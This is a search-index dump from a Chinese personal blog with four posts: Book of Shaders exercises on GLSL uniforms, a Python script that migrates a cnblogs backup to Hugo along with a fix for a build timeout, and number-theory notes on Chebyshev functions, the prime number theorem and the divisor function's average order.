[{"content":" 如有需要，请先阅读原文\nUniforms 随时间变化的红色：\n1 2 3 4 5 6 7 8 9 #ifdef GL_ES precision mediump float; #endif uniform float u_time; void main() { gl_FragColor = vec4(sin(u_time),0.0,0.0,1.0); } 降低颜色变化的速率，直到肉眼都看不出来。\ngl_FragColor = vec4(sin(u_time*0.001),0.0,0.0,1.0);\nsin中参数变小就可以减低速率。\n加速变化，直到颜色静止不动。\ngl_FragColor = vec4(sin(u_time*10000.0),0.0,0.0,1.0);\nsin中参数变大就可以加速速率直到不发生变化。\n玩一玩 RGB 三个通道，分别给三个颜色不同的变化速度，看看能不能做出有趣的效果。\n改变vec4的四个值可以随意组合\n1 2 3 4 5 6 7 8 9 10 11 12 #ifdef GL_ES precision mediump float; #endif uniform vec2 u_resolution; uniform vec2 u_mouse; uniform float u_time; void main() { vec2 st = gl_FragCoord.xy/u_resolution; gl_FragColor = vec4(st.x,st.y,0.0,1.0); } gl_FragCoord gl_FragCoord存储了活动线程正在处理的像素或屏幕碎片的坐标。有了它我们就知道了屏幕上的哪一个线程正在运转。他不是一个uniform值，因为他在不断变化。\n对于这样一张图来说，作者给出了四个问题：\n你明白 (0.0,0.0) 坐标在画布上的哪里吗？\nB通道是0，所以（0,0,0,1）是纯黑，也就是左下角。\n那 (1.0,0.0), (0.0,1.0), (0.5,0.5) 和 (1.0,1.0) 呢？ 首先左下角是(0,0)那么右上角就是(1.0,1.0)，紧接着我们查看四角，RGB中，(1,0,0)代表红色，也就是右下角，(0,1,0)代表绿色，也就是左上角：\n你知道如何用未规范化（normalized）的 u_mouse 吗？你可以用它来移动颜色吗？\n规范化：vec2 mouseNorm = u_mouse / u_resolution; 使用mouseNorm.xy就可以实现鼠标移动到坐标位置，全图展示出上图对应的颜色。\n为什么不写u_mouse.xy / u_resolution呢？\n因为u_mouse本身就是一个二维变量，xy直接包含在里面了。但是gl_FragCoord是当前像素的vec4变量，xy表示坐标，z表示深度，w分量通常是1（齐次坐标）。\n你可以用 u_time 和 u_mouse 来改变颜色的图案吗？不妨琢磨一些有趣的途径。\n1 2 3 4 5 6 7 8 9 10 11 12 13 void main() { vec2 st = gl_FragCoord.xy / u_resolution; vec2 mouseNorm = u_mouse / u_resolution; // 使用 u_time 和 u_mouse 产生动态波动效果 float r = sin(u_time + length(st - mouseNorm) * 10.0); float g = cos(u_time + length(st - mouseNorm) * 15.0); float b = sin(u_time * 0.5 + length(st - mouseNorm) * 20.0); vec3 color = vec3(r, g, b); gl_FragColor = vec4(color, 1.0); } ","date":"2024-09-13T00:00:00Z","permalink":"https://dorinxl.github.io/p/the-book-of-shadersuniforms%E5%80%BC/","title":"【The book of Shaders】Uniforms值"},{"content":"使用python解析cnblogs博客园xml备份 在个人博客园后台管理界面的左侧，找到\u0026quot;备份/导出\u0026quot;，创建备份后导出xml格式。\n然后用下面的python代码生成适用Hugo格式的文件内容。\n使用前请注意，由于我在博客园的博客大多是md(部分是html，也就是直接在博客园后台手打的)文件，这份代码更加偏向于md文件多的人使用，但是有html的blog存在的博客园也可以使用。\n如果出现差错也可以根据自己的需要进行修改。\n自己的备份文件要和代码处于同一目录下，且文件名要修改成CNBlogs_BlogBackup.xml，或者自行修改代码也行。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 import os import xml.etree.ElementTree as ET import requests import mimetypes import html2text import re # 加载XML文件 tree = ET.parse(\u0026#39;CNBlogs_BlogBackup.xml\u0026#39;) root = tree.getroot() namespace = {\u0026#39;atom\u0026#39;: \u0026#39;http://www.w3.org/2005/Atom\u0026#39;} def sanitize_filename(name): invalid_chars = [\u0026#39;/\u0026#39;, \u0026#39;\\\\\u0026#39;, \u0026#39;:\u0026#39;, \u0026#39;*\u0026#39;, \u0026#39;?\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;|\u0026#39;] for char in invalid_chars: name = name.replace(char, \u0026#39;_\u0026#39;) return name # 决定文件类型 def determine_extension(image_url, content_type): url_extension = os.path.splitext(image_url.split(\u0026#39;?\u0026#39;)[0].split(\u0026#39;#\u0026#39;)[0])[-1].lower() if url_extension in [\u0026#39;.jpg\u0026#39;, \u0026#39;.jpeg\u0026#39;, \u0026#39;.png\u0026#39;, \u0026#39;.gif\u0026#39;, \u0026#39;.bmp\u0026#39;, \u0026#39;.svg\u0026#39;, \u0026#39;.webp\u0026#39;]: return url_extension if content_type: mime_extension = mimetypes.guess_extension(content_type.split(\u0026#39;;\u0026#39;)[0].strip()) if mime_extension: return mime_extension return \u0026#39;.jpg\u0026#39; # 下载图片并保存到文件夹里 def download_image(image_url, folder_path): try: if image_url.startswith(\u0026#39;//\u0026#39;): image_url = \u0026#39;https:\u0026#39; + image_url elif not image_url.startswith((\u0026#39;http://\u0026#39;, \u0026#39;https://\u0026#39;)): image_url = \u0026#39;https://\u0026#39; + image_url # 添加超时提醒 response = requests.get(image_url, timeout=10) if response.status_code == 200: # 获取图片类型 content_type = response.headers.get(\u0026#39;Content-Type\u0026#39;, \u0026#39;\u0026#39;) extension = determine_extension(image_url, content_type) image_name = sanitize_filename(image_url.split(\u0026#39;/\u0026#39;)[-1].split(\u0026#39;?\u0026#39;)[0].split(\u0026#39;#\u0026#39;)[0]) if not image_name.lower().endswith((\u0026#39;.jpg\u0026#39;, \u0026#39;.png\u0026#39;, \u0026#39;.gif\u0026#39;)): image_name += extension image_path = os.path.join(folder_path, image_name) with open(image_path, \u0026#39;wb\u0026#39;) as f: f.write(response.content) return image_name else: print(f\u0026#34;Failed to download image from {image_url}, status code: {response.status_code}\u0026#34;) except requests.exceptions.RequestException as e: print(f\u0026#34;Error downloading image from {image_url}: {e}\u0026#34;) return None # 寻找并下载所有md中的图片链接 def replace_images(md_content, folder_path): image_pattern = re.compile(r\u0026#39;!\\[.*?\\]\\((.*?)\\)\u0026#39;) matches = image_pattern.findall(md_content) for image_url in matches: print(\u0026#34;download img : {0}\u0026#34;.format(image_url)) local_image_name = download_image(image_url, folder_path) if local_image_name: local_image_path = f\u0026#34;{local_image_name}\u0026#34; md_content = md_content.replace(image_url, local_image_path) return md_content # 遍历xml中的blog for entry in root.findall(\u0026#39;atom:entry\u0026#39;, namespace): title = entry.find(\u0026#39;atom:title\u0026#39;, namespace).text # 从标题中移除作者，xml中的标题是带着作者名字的 if \u0026#39;-你的名字\u0026#39; in title: title = title.replace(\u0026#39;-你的名字\u0026#39;, \u0026#39;\u0026#39;).strip() content = entry.find(\u0026#39;atom:content\u0026#39;, namespace).text published_date = entry.find(\u0026#39;atom:published\u0026#39;, namespace).text # 命名文件夹把空格替换了 folder_name = sanitize_filename(title.replace(\u0026#39; \u0026#39;, \u0026#39;_\u0026#39;)) # 每个blog post都需要一个文件夹 folder_path = os.path.join(os.getcwd(), folder_name) os.makedirs(folder_path, exist_ok=True) if content.strip().startswith(\u0026#39;\u0026lt;\u0026#39;): # 使用html2text把html的部分替换成md md_content = html2text.html2text(content) else: md_content = content # 把网络图床的图片路径替换成本地路径 md_content = replace_images(md_content, folder_path) # md文件头添加博客时间和内容 md_file_content = f\u0026#34;---\\nTitle: {title}\\nDate: {published_date}\\n---\\n\\n{md_content}\\n\u0026#34; # md文件保存为index.md表示当前博客内容 md_filename = os.path.join(folder_path, \u0026#39;index.md\u0026#39;) with open(md_filename, \u0026#39;w\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as md_file: md_file.write(md_file_content) print(\u0026#34;Conversion complete!\u0026#34;) 运行代码后，将直接在本目录下直接生成所有博客数量的、以各自博客名命名的若干文件夹，每个文件夹内包含若干图片和index.md。其中index.md保存博客内容，图片则是本地引用。\n将这些文件夹移动到你的Hugo博客的content/post下面就可以了。\nBuild博客时报错解决 我使用Github Pages，每次本地更新后push到私有库，再由私有库workflow更新公开库静态页面。这中间的rebuild过程中出现过几次差错，记录下。\n在build web的时候，报错超时内容：This is most likely due to infinite recursion. If this is just a slow template, you can try to increase the \u0026rsquo;timeout\u0026rsquo; config setting.一开始我认为只是因为我对博客的装修导致某些地方编译出错了，但是当我将theme文件夹初始化之后还是存在这样的问题。\n经过查阅资料，这是因为编译时间过长导致hugo认为遇到了无限递归，实际上只是因为时间比较长而已。将超时时间设定得大一些就好了，直接在Hugo.yaml文件里加一行：timeout: 600000，代表10分钟。\n设定好之后build应该就没有问题了，同时可以看到：\n结论是大量图片的构建导致build时间拉长了不少。\n","date":"2024-09-04T00:00:00Z","permalink":"https://dorinxl.github.io/p/%E5%8D%9A%E5%AE%A2%E5%9B%AD%E5%A4%87%E4%BB%BD%E8%BF%81%E7%A7%BB%E5%88%B0hugo%E5%8F%8Abuild%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/","title":"博客园备份迁移到Hugo及Build错误解决方法"},{"content":"素数分布的基本定理（一） 本文使用Typora编写，但Hugo使用KaTex渲染，可能会出现不兼容状态，如需最佳体验请前往这里\n目录 Chapter1 切比雪夫函数$\\psi(x)$和$\\vartheta(x)$ Chapter2 $\\vartheta(x)$与$\\pi(x)$的关系 Chapter3 素数定理的等价形式 Chapter1 切比雪夫函数$\\psi(x)$和$\\vartheta(x)$ Definition：\n对于$x\u0026gt;1$，$\\psi(x)$定义为： $$ \\psi(x) = \\sum_{n\\le x}\\Lambda(n) = \\sum_{m\\le \\log_2{x}}\\sum_{p\\le x^{1/m}}\\log{p} $$\n对于$x\u0026gt;0$，$\\vartheta(x)$定义为： $$ \\vartheta(x) = \\sum_{p\\le x}\\log{p} $$\nTheorem:\nTh1:Mangoldt函数$\\Lambda(n)$的变化，即为什么： $$ \\sum_{n\\le x}\\Lambda(n) = \\sum_{m\\le \\log_2{x}}\\sum_{p\\le x^{1/m}}\\log{p} $$ Proof:\n根据$\\Lambda(n)$函数的定于，如果$n$不是某个素数的幂，那么$\\Lambda(n)=0$。\n于是我们可以将$\\sum_{n\\le x}\\Lambda(n)$表示为 $$ \\sum_{n\\le x}\\Lambda(n) =\\sum_{m=1}^{\\infty}\\sum_{p^m\\le x}\\Lambda(p^m) = \\sum_{m=1}^{\\infty}\\sum_{p\\le x^{1/m}}\\log p $$ 关于后面的那个sum，其中的$p,x,m$三者形成了一个关系。实际上，p是从2开始的，也就是说$x^{1/m}\u0026lt;2$的话，sum是0。\n我们将$x^{1/m}\u0026lt;2$这个条件进行变换： $$ x^{1/m}\u0026lt;2\\newline \\dfrac{1}{m}\\log x \u0026lt; \\log 2\\newline m \u0026gt; \\dfrac{\\log x}{\\log 2} = \\log_2{x} $$ 于是我们得到了m和x的一个关系，于是就可以将前面sum的无穷转换为新的形式： $$ \\sum_{m=1}^{\\infty}\\sum_{p\\le x^{1/m}}\\log p = \\sum_{m\\le \\log_2{x}}\\sum_{p\\le x^{1/m}}\\log p $$ 有了这样的形式，我们也可以将$\\psi(x)$与$\\vartheta(x)$联系起来： $$ \\psi(x) = \\sum_{m\\le \\log_2{x}}\\vartheta(x^{1/m}) $$\nTh2:关于$\\dfrac{\\psi(x)}{x}$与$\\dfrac{\\vartheta(x)}{x}$两者之间的关系：其中一个趋于一个极限，那么另一个也趋于这个极限。也就是说： $$ \\lim_{x\\rightarrow\\infty}(\\dfrac{\\psi(x)}{x}-\\dfrac{\\vartheta(x)}{x})=0 $$ Proof:\n通过$\\psi(x)$与$\\vartheta(x)$的关系我们可以得到一个减法： $$ \\psi(x) - \\vartheta(x) = \\sum_{m\\le \\log_2{x}}\\vartheta(x^{1/m}) - \\vartheta(x) = \\sum_{1 \\le m \\le \\log_2{x}}\\vartheta(x^{1/m}) $$ 现在目光聚集到$\\vartheta$上，对于$\\vartheta$的定义，我们可以写出不等式： $$ \\vartheta(x) = \\sum_{p\\le x}\\log p \\le x \\log p $$ 于是有 $$ \\begin{align*} 0 \\le \\psi(x)-\\vartheta(x) \\le \\sum_{2\\le m \\le \\log_2x}x^{1/m}\\log x^{1/m}\\newline \\end{align*}\\newline $$ 将其扩大，放缩为 $$ \\sum_{2\\le m \\le \\log_2x}\\log x^{1/m} \\le (\\log_2 x)\\sqrt{x}\\log\\sqrt{x} \\newline = \\dfrac{\\log x}{\\log 2}\\dfrac{\\sqrt{x}}{2}\\log x \\newline = \\dfrac{\\sqrt{x}(\\log x)^2}{2\\log 2} $$ 同时去除x最后得到： $$ 0\\le \\dfrac{\\psi(x)}{x} = \\dfrac{\\vartheta(x)}{x}\\le \\dfrac{(\\log x)^2}{2\\sqrt{x}\\log2} $$ 根据夹逼定理： $$ \\begin{align*} \\lim_{x\\rightarrow\\infty} \\dfrac{(\\log x)^2}{2\\sqrt{x}\\log2} \u0026amp;= \\dfrac{1}{2\\log2}\\lim_{x\\rightarrow\\infty}\\dfrac{(\\log x)^2}{\\sqrt{x}} \\newline \u0026amp;=\\dfrac{1}{2\\log2}\\lim_{x\\rightarrow\\infty}\\dfrac{4\\log x}{\\sqrt{x}} \\newline \u0026amp;=\\dfrac{2}{\\log2}\\lim_{x\\rightarrow\\infty}\\dfrac{2}{\\sqrt{x}} \\newline \u0026amp;=0 \\end{align*} $$ 可以得出 $$ \\lim_{x\\rightarrow\\infty}(\\dfrac{\\psi(x)}{x}-\\dfrac{\\vartheta(x)}{x})=0 $$\nNote:\nChapter2 $\\vartheta(x)$与$\\pi(x)$的关系 Theorem:\nTh1:（阿贝尔等式）对任一数论函数$a(n)$，令其部分和为 $$ A(x) = \\sum_{n\\le x}a(n) $$ 当$x\u0026lt;1$时，$A(x)=0$。如果函数$f$在区间$[y，x],(0\u0026lt;y\u0026lt;x)$上有连续导数，那么有： $$ \\sum_{y\u0026lt;n\\le x}a(n)f(n) = A(x)f(x)-A(y)f(y)-\\int_{y}^{x}A(t)f\u0026rsquo;(t)dt $$ Proof:\n令$k = \\lfloor x\\rfloor,m = \\lfloor y\\rfloor$。这样一来$A(k)=A(x),A(m)=A(y)$ $$ \\begin{align*} \\sum_{y\u0026lt;n\\le x}a(n)f(n)\u0026amp;=\\sum_{n=m+1}^ka(n)f(n)\\newline \u0026amp;=\\sum_{n=m+1}^k{A(n)-A(n-1)}f(n)\\newline \u0026amp;=\\sum_{n=m+1}^kA(n)f(n) -\\sum_{n=m}^{k-1}A(n)f(n+1)\\newline \u0026amp;=\\sum_{n=m+1}^{k-1}A(n)f(n)+A(k)f(k)-\\sum_{n=m}^{k-1}A(n)f(n+1)\\newline \u0026amp;=\\sum_{n=m+1}^{k-1}A(n){f(n)-f(n+1)}+A(k)f(k)-A(m)f(m+1)\\newline \u0026amp;=-\\sum_{n=m+1}^{k-1}A(n)\\int_{n}^{n+1}f\u0026rsquo;(t)dt+A(k)f(k)-A(m)f(m+1)\\newline \u0026amp;=-\\sum_{n=m+1}^{k-1}\\int_{n}^{n+1}A(t)f\u0026rsquo;(t)dt+A(k)f(k)-A(m)f(m+1)\\newline \u0026amp;=-\\int_{m+1}^{k}A(t)f\u0026rsquo;(t)dt+A(k)f(k)-A(m)f(m+1)\\newline 用同样的思想向着\\int_y^x出发： \u0026amp;=-\\int_{m+1}^{k}A(t)f\u0026rsquo;(t)dt-{\\int_k^xA(t)f\u0026rsquo;(t)dt+A(k)f(x)}-{\\int_y^m+1A(t)f\u0026rsquo;(t)dt+A(m)f(y)}\\newline \u0026amp;=A(x)f(x)-A(y)f(y)-\\int_y^xA(t)f\u0026rsquo;(t)dt \\end{align*} $$\nTh2:接下来我们分别用$\\pi(x)$将$\\vartheta(x)$表示出来，再用$\\vartheta(x)$将$\\pi(x)$表示出来： $$ \\vartheta(x) = \\pi(x)\\log x-\\int_2^x\\dfrac{\\pi(t)}{t}dt\\newline 和\\newline \\pi(x) = \\dfrac{\\vartheta(x)}{\\log x}+\\int_2^x\\dfrac{\\vartheta(t)}{t\\log^2t}dt $$ Proof:\n我们知道，$\\pi(x)$计算的是小于等于x的范围内有多少个素数，如果用求和的形式将其表示出来的话就是$\\pi(x) = \\sum_{p\\le x}1$，我们可以用一个特征函数表示: $$ a(n) = \\begin{cases} 1,若n是素数\\newline 0,其他 \\end{cases} $$ 所以$\\pi(x) = \\sum_{p\\le x}1 = \\sum_{1\u0026lt;n\\le x}a(n)$\n基于这个特征函数也可以将$\\vartheta(x)$表示成$\\vartheta(x) = \\sum_{p\\le x}\\log p= \\sum_{1\u0026lt;n\\le x}a(n)\\log n$\n这两个函数在配合上面的阿贝尔等式，$f(n) = \\log n $,我们就可以得到： $$ \\vartheta(x) = \\pi(x)\\log{x}-\\pi(1)\\log{1}-\\int_1^x\\pi(t)(\\log t)\u0026lsquo;dt $$ 当t\u0026lt;2的时候，$\\pi(t)=0$，于是最终形式如下： $$ \\vartheta(x) = \\pi(x)\\log{x}-\\int_2^x\\dfrac{\\pi(t)}{t}dt $$ 接下来对$\\pi(x)$进行转换。\n如果我们想用$\\vartheta(x)$将$\\pi(x)$表示出来，可以用$b(n)=a(n)\\log n$将$\\vartheta(x)$表示为部分和$\\vartheta(x)=\\sum_{n\\le x}b(n)$的形式，然后就可以使用$f(n)=\\dfrac{1}{\\log n}$阿贝尔等式展开了： $$ \\pi(x) = \\sum_{y\u0026lt;n\\le x}b(n)\\dfrac{1}{\\log n} = b(x)\\dfrac{1}{\\log x}-b(y)\\dfrac{1}{\\log y} - \\int_y^xb(t)(\\dfrac{1}{\\log t})\u0026lsquo;dt $$ 展开后得到： $$ \\pi(x) =\\vartheta(x)\\dfrac{1}{\\log x}-\\vartheta(y)\\dfrac{1}{\\log y} + \\int_y^x\\dfrac{\\vartheta(t)}{t\\log^2 t}dt $$ 当$0\u0026lt;y\u0026lt;2$时，$\\vartheta(y)=0$，最终我们得到： $$ \\pi(x) =\\vartheta(x)\\dfrac{1}{\\log x} + \\int_2^x\\dfrac{\\vartheta(t)}{t\\log^2 t}dt $$\nNote:\nChapter3 素数定理的等价形式 Theorem:\nTh1:下面这几个式子是等价的 $$ \\begin{equation*} \\lim_{x\\rightarrow\\infty}\\dfrac{\\pi(x)\\log x}{x}=1\\newline \\lim_{x\\rightarrow\\infty}\\dfrac{\\vartheta(x)}{x}=1\\newline \\lim_{x\\rightarrow\\infty}\\dfrac{\\psi(x)}{x}=1 \\end{equation*} $$ Proof:\n由C2.Th2得到 $$ \\dfrac{\\vartheta(x)}{x} = \\dfrac{\\pi(x)\\log x}{x}-\\dfrac{1}{x}\\int_2^x\\dfrac{\\pi(t)}{t}dt\\newline 和\\newline \\dfrac{\\pi(x)\\log x}{x} = \\dfrac{\\vartheta(x)}{x}+\\dfrac{\\log x}{x}\\int_2^x\\dfrac{\\vartheta(t)}{t\\log^2t}dt $$ 证明$\\dfrac{\\vartheta(x)}{x}$和$\\dfrac{\\pi(x)\\log x}{x}$的等价关系，只需要分别证明：\n（1）$\\lim_{x\\rightarrow\\infty}\\dfrac{1}{x}\\int_2^x\\dfrac{\\pi(t)}{t}dt=0$:\n通过第一个式子我们可以得到$\\dfrac{\\pi(x)}{x}=\\Omicron(\\dfrac{1}{\\log x})$，于是 $$ \\dfrac{1}{x}\\int_2^x\\dfrac{\\pi(t)}{t}dt = \\Omicron(\\dfrac{1}{x}\\int_2^x\\dfrac{1}{\\log t}dt)\\newline \\int_2^x\\dfrac{1}{\\log t}dt = \\int_2^{\\sqrt x}\\dfrac{1}{\\log t}dt + \\int_{\\sqrt x}^x\\dfrac{1}{\\log t}dt \\le \\dfrac{\\sqrt{x}}{\\log 2}+\\dfrac{x-\\sqrt{x}}{\\log \\sqrt{x}} $$ 乘起来 $$ \\dfrac{1}{x}\\int_2^x\\dfrac{\\pi(t)}{t}dt \\le \\dfrac{1}{x}{\\dfrac{\\sqrt{x}}{\\log 2}+\\dfrac{x-\\sqrt{x}}{\\log \\sqrt{x}}}=\\dfrac{1}{\\sqrt{x}\\log 2}+\\dfrac{1-\\dfrac{1}{\\sqrt{x}}}{\\log \\sqrt{x}}\\newline \\lim_{x\\rightarrow\\infty}{\\dfrac{1}{\\sqrt{x}\\log 2}+\\dfrac{1-\\dfrac{1}{\\sqrt{x}}}{\\log \\sqrt{x}}} = 0\\newline 所以\\lim_{x\\rightarrow\\infty}\\dfrac{1}{x}\\int_2^x\\dfrac{\\pi(t)}{t}dt \\rightarrow0 $$ （2）$\\lim_{x\\rightarrow\\infty}\\dfrac{\\log x}{x}\\int_2^x\\dfrac{\\vartheta(t)}{t\\log^2t}dt=0$：\n通过第二个式子我们可以得到$\\vartheta(t)=\\Omicron(t)$，于是 $$ \\dfrac{\\log x}{x}\\int_2^x\\dfrac{\\vartheta(t)}{t\\log^2t}dt = \\Omicron(\\dfrac{\\log x}{x}\\int_2^x\\dfrac{1}{\\log^2t}dt)\\newline \\int_2^x\\dfrac{1}{\\log^2t}dt = \\int_2^{\\sqrt{x}}\\dfrac{1}{\\log^2t}dt + \\int_{\\sqrt{x}}^x\\dfrac{1}{\\log^2t}dt\\le \\dfrac{\\sqrt{x}}{\\log^22}+\\dfrac{x-\\sqrt{x}}{\\log^2\\sqrt{2}} $$ 乘起来 $$ \\dfrac{\\log x}{x}\\int_2^x\\dfrac{\\vartheta(t)}{t\\log^2t}dt \\le \\dfrac{\\log x}{x}{\\dfrac{\\sqrt{x}}{\\log^22}+\\dfrac{x-\\sqrt{x}}{\\log^2\\sqrt{x}}} = \\dfrac{\\log x}{\\sqrt{x}\\log^22}+\\dfrac{2(1-\\dfrac{1}{\\sqrt{x}})}{\\log\\sqrt{x}}\\newline lim_{x\\rightarrow\\infty}{\\dfrac{\\log x}{\\sqrt{x}\\log^22}+\\dfrac{2(1-\\dfrac{1}{\\sqrt{x}})}{\\log\\sqrt{x}}} =0\\newline 所以：lim_{x\\rightarrow\\infty}\\dfrac{\\log x}{x}\\int_2^x\\dfrac{\\vartheta(t)}{t\\log^2t}dt \\rightarrow0 $$\nTh2:接下来我们将素数定理和第n个素数的渐进值联系起来**:令$p_n$是第n个素数**，下面几个渐进式是逻辑等价的。 $$ \\begin{gather} \\lim_{x\\rightarrow\\infty}\\dfrac{\\pi(x)\\log x}{x} = 1 \\newline \\lim_{x\\rightarrow\\infty}\\dfrac{\\pi(x)\\log{\\pi(x)}}{x} = 1 \\newline \\lim_{n\\rightarrow\\infty}\\dfrac{p_n}{n\\log n } = 1 \\end{gather} $$ Proof:\n第一个式子推第二个：\n对第一个式子两边取对数得 $$ \\lim_{x\\rightarrow\\infty}[\\log{\\pi(x)}+\\log{\\log x}-\\log{x}]=0 \\newline \\lim_{x\\rightarrow\\infty}\\log x[{\\dfrac{{\\log \\pi(x)}}{\\log{x}}+\\dfrac{\\log{\\log x}}{\\log{x}}-1}]=0 $$ 当$x\\rightarrow\\infty$时，前面的$\\log x\\rightarrow\\infty$，于是后面的$\\lim_{x\\rightarrow\\infty}[{\\dfrac{{\\log\\pi(x)}}{\\log{x}}+\\dfrac{\\log{\\log x}}{\\log{x}}-1}]=0$。然而中间的又是0\n即$\\lim_{x\\rightarrow\\infty}{\\dfrac{{\\log\\pi(x)}}{\\log{x}}}=1$\n于是$\\lim_{x\\rightarrow\\infty}{\\dfrac{{\\log\\pi(x)}}{\\log{x}}\\dfrac{\\pi(x)\\log x}{x}}=\\lim_{x\\rightarrow\\infty}\\dfrac{\\pi(x)\\log x}{x}=1$\n第二个式子推第三个：\n$p_n$是第n个素数，我们用x表示$p_n$。那么$\\pi(x)=n，\\pi(x)\\log\\pi(x) = n\\log n$\n于是$\\lim_{x\\rightarrow\\infty}\\dfrac{\\pi(x)\\log{\\pi(x)}}{x} = \\lim_{x\\rightarrow\\infty}\\dfrac{n\\log n}{p_n}=1$\n第三个式子推第二个：\n式3成立，给定x，由不等式$p_n\\le x \u0026lt; p_{n+1}$确定n，$n=\\pi(x)$，于是有不等式： $$ \\dfrac{p_n}{n\\log n} \\le \\dfrac{x}{n\\log n } \u0026lt; \\dfrac{p_{n+1}}{n\\log n}=\\dfrac{p_{n+1}}{(n+1)\\log{(n+1)}}\\dfrac{(n+1)\\log{(n+1)}}{n\\log n} $$ 如此一来就构成了满足式3的$p_n,p_{n+1}$，根据夹逼可以知道$\\lim_{x\\rightarrow\\infty}\\dfrac{x}{n\\log n}=1$\n将n替换为$\\pi(x)$就得到了式2\n第二个式子推第一个：\n对式2取对数得 $$ \\lim_{x\\rightarrow\\infty}[\\log\\pi(x) + \\log \\log{\\pi(x)} - \\log x] = 0 \\newline \\lim_{x\\rightarrow\\infty}\\log\\pi(x)[1+\\dfrac{\\log\\log\\pi(x)}{\\log\\pi(x)}-\\dfrac{\\log x}{\\log\\pi(x)}] = 0 \\newline $$ 外面的$\\log\\pi(x)\\rightarrow\\infty$，那么里面的就有$\\lim_{x\\rightarrow\\infty}1+\\dfrac{\\log\\log\\pi(x)}{\\log\\pi(x)}-\\dfrac{\\log x}{\\log\\pi(x)} = 0 $，中间的$\\lim_{x\\rightarrow\\infty}\\dfrac{\\log\\log\\pi(x)}{\\log x}=0$\n于是剩下的$\\lim_{x\\rightarrow\\infty}\\dfrac{\\log x}{\\log\\pi(x)}=1$\n结合式2得到$\\lim_{x\\rightarrow\\infty}\\dfrac{\\log x}{\\log\\pi(x)}\\dfrac{\\pi(x)\\log\\pi(x)}{x}=\\dfrac{\\pi(x)\\log x}{x}=1$\n于是证出第一个式子。\nNote:\n","date":"2023-09-23T12:15:00Z","image":"https://dorinxl.github.io/p/%E7%B4%A0%E6%95%B0%E5%88%86%E5%B8%83%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%AE%9A%E7%90%86%E4%B8%80/number%20theory_hu7879852701106491212.jpg","permalink":"https://dorinxl.github.io/p/%E7%B4%A0%E6%95%B0%E5%88%86%E5%B8%83%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%AE%9A%E7%90%86%E4%B8%80/","title":"素数分布的基本定理（一）"},{"content":" 本文使用Typora编写，但Hugo使用KaTex渲染，可能会出现不兼容状态，如需最佳体验请前往这里\n几个函数的平均阶 目录 Chapter1 $d(n)$的平均阶 Chapter2 除数函数$\\sigma_\\alpha(n)$的平均阶 Chapter3 $\\mu(n)$和$\\Lambda(n)$的平均阶 Chapter1 $d(n)$的平均阶 Theorem:\n**Th1:**对所有$x\\ge1$，我们有 $$ \\sum_{n\\le x}d(n)=x\\log x+(2C-1)x+\\Omicron(\\sqrt x) $$\n其中C是欧拉常数\nProof:\n我们知道，$d(n)=\\sum_{d|n}1$，所以我们有 $$ \\sum_{n\\le x}d(n)=\\sum_{n\\le x}\\sum_{d|n}1 $$ 我们把$n=qd$，那么对于$q,d$展开就变成了 $$ \\sum_{n\\le x}d(n)=\\sum_{q,d \\newline qd\\le x}1 $$ 结合图像我们可以形象的明白，我们取的点即是在$qd$平面上的一些格点。\n也就是当n=1，2，\u0026hellip;，[x]时，曲线qd=n上的格点的个数。\n我们固定每一个小于x的$d$，计算水平上q可以取的格点的数目，然后对于所有的$d\\le x$求和，最终得到： $$ \\sum_{n\\le x}d(n)=\\sum_{d\\le x}\\sum_{q\\le\\frac{x}{d}}1 $$ 根据欧拉求和公式，我们可以得到 $$ \\sum_{q\\le\\frac{x}{d}}1=\\dfrac{x}{d}+\\Omicron(1) $$ 继续用欧拉求和公式，得到、 $$ \\begin{align*} \\sum_{n\\le x}d(n)\u0026amp;=\\sum_{d\\le x}\\sum_{q\\le\\frac{x}{d}}1 \\newline \u0026amp;=\\sum_{d\\le x}{\\dfrac{x}{d}+\\Omicron(1)} \\newline \u0026amp;=x\\sum_{d\\le x}\\dfrac{1}{d}+\\Omicron(x) \\newline \u0026amp;=x{\\log x+C+\\Omicron(\\dfrac{1}{x})}+\\Omicron(x) \\newline \u0026amp;=x\\log x+\\Omicron(x) \\end{align*} $$ 由此得出$\\sum_{n\\le x}d(n) \\sim x\\log x,x\\rightarrow\\infty$\n我们可以加强这个式子，还是从图片入手，我们换个思路：利用对称性，格点的总数等于在直线$q=d$下面的格点数的2倍加上这条线上的格点数：\n既然qd=n，我们更关注q=d这条线，那么遍历d从1到$[\\sqrt x]$，每固定d，那么q就有$[\\sqrt\\frac{x}{d}]$个格点可以选择，那么阴影区域的格点数为$[\\dfrac{x}{d}]-d$个。\n于是我们得到新的式子 $$ \\sum_{n\\le x}d(n)=2\\sum_{d\\le\\sqrt x}{[\\dfrac{x}{d}]-d}+[\\sqrt x] $$ 利用$[y]=y+\\Omicron(1)$和求和公式的推论得到 $$ \\begin{align*} \\sum_{n\\le x}d(n)\u0026amp;=2\\sum_{d\\le\\sqrt x}{[\\dfrac{x}{d}]-d}+[\\sqrt x] \\newline \u0026amp;=2\\sum_{d\\le\\sqrt x}{\\dfrac{x}{d}-d+\\Omicron(1)}+\\Omicron(\\sqrt x) \\newline \u0026amp;=2x\\sum_{d\\le\\sqrt x}\\dfrac{1}{d}-2\\sum_{d\\le\\sqrt x}d+\\Omicron(\\sqrt x) \\newline \u0026amp;=2x{\\log \\sqrt x+C+\\Omicron(\\dfrac{1}{\\sqrt x})}-2{\\dfrac{x}{2}+\\Omicron(\\sqrt x)}+\\Omicron(\\sqrt x) \\newline \u0026amp;=x\\log x+(2C-1)x+\\Omicron(\\sqrt x) \\end{align*} $$ 这就是除数函数$d(n)$的部分和的迪利克雷渐进公式。\nDirichlet\u0026rsquo;s asymptotic formula for the partial sums of the divisor function d(n).\nChapter2 除数函数$\\sigma_\\alpha(n)$的平均阶 